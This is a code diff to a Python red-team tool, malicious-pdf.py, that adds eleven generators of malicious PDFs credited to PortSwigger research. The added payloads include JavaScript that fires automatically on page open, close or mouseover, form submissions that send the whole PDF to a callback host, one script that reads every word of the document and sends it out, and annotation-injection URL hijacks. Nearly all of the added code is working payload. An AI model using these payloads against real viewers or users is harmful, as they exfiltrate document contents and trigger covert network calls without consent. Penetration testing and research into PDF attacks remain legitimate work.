@@ -1,15 +1,16 @@
 #!/usr/bin/python
 # -*- coding: UTF-8 -*-
 ##
-## Create different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
+## Generate 29 malicious PDF files with phone-home functionality
+## Used for penetration testing and/or red-teaming etc
 ##
-## Usage ./malicious-pdf.py burp-collaborator-url
+## Usage: python3 malicious-pdf.py <callback-url>
 ##
-## Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
+## Output will be written to the output/ directory as test1.pdf, test2.pdf, etc.
 ##
 ## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
 ##
-## Jonas Lejon, 2023 <jonas.github@triop.se>
+## Jonas Lejon, 2023-2026 <jonas.github@triop.se>
 ## https://github.com/jonaslejon/malicious-pdf
 
 import sys
@@ -20,6 +21,11 @@ import validators
 import os
 import argparse
 from pathlib import Path
+
+KNOWN_SCHEMES = ('http://', 'https://', 'ftp://', 'ftps://', 'file://', 'smb://',
+                  'ssh://', 'telnet://', 'gopher://', 'ldap://', 'mailto:', 'news:',
+                  'nntp://', 'irc://', 'data:', 'javascript:')
+
 
 def validate_url_or_ip_validators(input_string):
     """Validates if input is an IP address or a URL with a scheme."""
@@ -37,10 +43,7 @@ def validate_url_or_ip_validators(input_string):
         return True
 
     # 3. Check if it has a scheme prefix for other protocols
-    schemes = ['ftp://', 'ftps://', 'file://', 'smb://', 'ssh://', 'telnet://',
-               'gopher://', 'ldap://', 'mailto:', 'news:', 'nntp://', 'irc://',
-               'data:', 'javascript:']
-    for scheme in schemes:
+    for scheme in KNOWN_SCHEMES:
         if input_string.lower().startswith(scheme):
             # Basic validation: ensure there's something after the scheme
             if len(input_string) > len(scheme):
@@ -50,8 +53,8 @@ def validate_url_or_ip_validators(input_string):
 
 
 def ensure_scheme(host):
-    """Ensure the host has a scheme."""
-    if not host.startswith(('http://', 'https://')):
+    """Add https:// if the host has no recognized scheme (e.g. bare IP address)."""
+    if not host.lower().startswith(KNOWN_SCHEMES):
         return f'https://{host}'
     return host
 
@@ -899,11 +902,796 @@ trailer
 >>''')
 
 
+# PortSwigger Research: Annotation URI Injection with JavaScript action
+# Demonstrates injection via unescaped parentheses in annotation URI fields
+# Exploits PDF-Lib and jsPDF which fail to escape parentheses
+# Duplicate /A key in annotation dict - second (JavaScript) overrides first (URI)
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf18(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Rect [0 0 595 842]
+                 /A << /S /URI /URI (blah) >>
+                 /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test18"), cFS: "CHTTP"})) /Type /Action >>
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'annot-inject') Tj
+  ET
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000850 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+startxref
+970
+%%EOF
+''')
+
+
+# PortSwigger Research: PV (Page Visible) auto-execution
+# Screen annotation fires JavaScript automatically when page becomes visible
+# No user interaction required - targets Acrobat Reader
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf19(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Screen
+                 /Rect [0 0 900 900]
+                 /AA << /PV << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test19"), cFS: "CHTTP"})) >> >>
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'pv-auto'     ) Tj
+  ET
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000820 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+startxref
+940
+%%EOF
+''')
+
+
+# PortSwigger Research: PC (Page Close) triggered execution
+# Annotation fires JavaScript when the page or document is closed
+# No user interaction required - targets Acrobat Reader
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf20(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Screen
+                 /Rect [0 0 900 900]
+                 /AA << /PC << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test20"), cFS: "CHTTP"})) >> >>
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'pc-close'    ) Tj
+  ET
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000820 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+startxref
+940
+%%EOF
+''')
+
+
+# PortSwigger Research: SubmitForm with SubmitPDF flag
+# Sends the entire PDF document contents to the attacker server
+# Uses Flags 256 (SubmitPDF) instead of Flags 4 (SubmitHTML)
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf21(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'submitpdf'   ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /SubmitForm
+     /F << /Type /FileSpec /F (''' + host + '''/test21.pdf) /V true /FS /URL >>
+     /Flags 256
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000187 00000 n
+0000000288 00000 n
+0000000553 00000 n
+0000000673 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+900
+%%EOF
+''')
+
+
+# PortSwigger Research: JavaScript submitForm() API
+# Uses this.submitForm() to submit PDF contents via JavaScript
+# Submits as PDF format using cSubmitAs parameter - targets Acrobat Reader
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf22(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+  <</Pages <<>>
+  /OpenAction
+      <<
+      /S/JavaScript
+      /JS(
+      this.submitForm({cURL: "''' + host + '''/test22", cSubmitAs: "PDF"});
+      )
+      >>
+  >>
+>>''')
+
+
+# PortSwigger Research: Button Widget injection for Chrome/PDFium
+# Invisible button widget covering entire page executes JavaScript on click
+# Requires /AcroForm in catalog and Widget annotation with /FT /Btn
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf23(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /Fields [5 0 R] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [5 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'widget-btn'  ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Annot
+     /Subtype /Widget
+     /Rect [0 0 900 700]
+     /Parent << /FT /Btn /T (a) >>
+     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test23"), cFS: "CHTTP"})) >>
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000090 00000 n
+0000000191 00000 n
+0000000560 00000 n
+0000000680 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+920
+%%EOF
+''')
+
+
+# PortSwigger Research: Text Field Widget for blind SSRF
+# Widget with text field type submits form data as POST body
+# Enables blind SSRF attacks via PDF form field submission
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf24(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /Fields [5 0 R] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [5 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'widget-tx'   ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Annot
+     /Subtype /Widget
+     /Rect [0 0 900 700]
+     /Parent << /FT /Tx /T (foo) /V (bar) >>
+     /A << /S /JavaScript /JS (this.submitForm("''' + host + '''/test24", false, false, ["foo"])) >>
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000090 00000 n
+0000000191 00000 n
+0000000560 00000 n
+0000000680 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+930
+%%EOF
+''')
+
+
+# PortSwigger Research: Content extraction via getPageNthWord()
+# JavaScript reads all rendered text from the PDF and exfiltrates it
+# Loops through all pages and words, sends data via network callback
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf25(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 85 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (SECRET: The quick brown fox jumps) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (var w=[];for(var p=0;p<this.numPages;p++){for(var i=0;i<this.getPageNumWords(p);i++){w.push(this.getPageNthWord(p,i,true))}}app.openDoc({cPath:encodeURI("''' + host + '''/test25?d="+w.join("+")),cFS:"CHTTP"}))
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000080 00000 n
+0000000181 00000 n
+0000000450 00000 n
+0000000590 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+950
+%%EOF
+''')
+
+
+# PortSwigger Research: Mouseover trigger via E (mouse enter) entry
+# Annotation fires JavaScript on mouseover without requiring a click
+# Uses additional action dictionary with E entry - targets PDFium
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf26(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Rect [0 0 900 900]
+                 /AA << /E << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test26"), cFS: "CHTTP"})) >> >>
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'mouseover'   ) Tj
+  ET
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000810 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+startxref
+930
+%%EOF
+''')
+
+
+# PortSwigger Research: Hybrid Acrobat/Chrome payload
+# Single PDF targets both Acrobat (via OpenAction JavaScript) and Chrome (via Widget button)
+# Uses distinct callback paths to identify which viewer triggered
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf27(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+     /AcroForm << /Fields [6 0 R] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [6 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'hybrid'      ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-acrobat"), cFS: "CHTTP"}))
+  >>
+endobj
+
+6 0 obj
+  << /Type /Annot
+     /Subtype /Widget
+     /Rect [0 0 900 700]
+     /Parent << /FT /Btn /T (a) >>
+     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-chrome"), cFS: "CHTTP"})) >>
+  >>
+endobj
+
+xref
+0 7
+0000000000 65535 f
+0000000010 00000 n
+0000000100 00000 n
+0000000201 00000 n
+0000000570 00000 n
+0000000690 00000 n
+0000000870 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+1120
+%%EOF
+''')
+
+
+# PortSwigger Research: URL hijacking in annotations
+# Injection via unescaped parentheses redirects annotation clicks to attacker URL
+# Duplicate /A key - second (attacker URI) overrides first (original URI)
+# Exploits PDF-Lib and jsPDF which fail to escape parentheses
+# Source: https://portswigger.net/research/portable-data-exfiltration
+def create_malpdf28(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Rect [0 0 595 842]
+                 /A << /S /URI /URI (blah) >>
+                 /A << /S /URI /URI (''' + host + '''/test28) /Type /Action >>
+                 /F 0
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'uri-hijack'  ) Tj
+  ET
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000790 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+startxref
+910
+%%EOF
+''')
+
+
 def main():
     """Main function to generate malicious PDFs."""
-    parser = argparse.ArgumentParser(description="Create different types of malicious PDF files.")
-    parser.add_argument("host", help="The hostname or IP address to use in the PDF files.")
-    parser.add_argument("--output-dir", default=".", help="The directory to save the PDF files in.")
+    parser = argparse.ArgumentParser(
+        description="Generate 29 malicious PDF files with phone-home functionality for penetration testing. "
+                    "Covers URI actions, JavaScript execution, form submission, annotation injection, "
+                    "widget-based XSS, content extraction, and more. "
+                    "Use with Burp Collaborator or Interact.sh to detect callbacks."
+    )
+    parser.add_argument("host", help="Callback URL or IP address (e.g. https://burp-collaborator-url)")
+    parser.add_argument("--output-dir", default="output", help="Directory to save generated PDF files (default: output/)")
     args = parser.parse_args()
 
     host = args.host
@@ -935,6 +1723,17 @@ def main():
         15: (create_malpdf15, ensure_scheme(host)),
         16: (create_malpdf16, ensure_scheme(host)),
         17: (create_malpdf17, ensure_scheme(host)),
+        18: (create_malpdf18, ensure_scheme(host)),
+        19: (create_malpdf19, ensure_scheme(host)),
+        20: (create_malpdf20, ensure_scheme(host)),
+        21: (create_malpdf21, ensure_scheme(host)),
+        22: (create_malpdf22, ensure_scheme(host)),
+        23: (create_malpdf23, ensure_scheme(host)),
+        24: (create_malpdf24, ensure_scheme(host)),
+        25: (create_malpdf25, ensure_scheme(host)),
+        26: (create_malpdf26, ensure_scheme(host)),
+        27: (create_malpdf27, ensure_scheme(host)),
+        28: (create_malpdf28, ensure_scheme(host)),
     }
 
     file_extensions = {14: '.svg'}
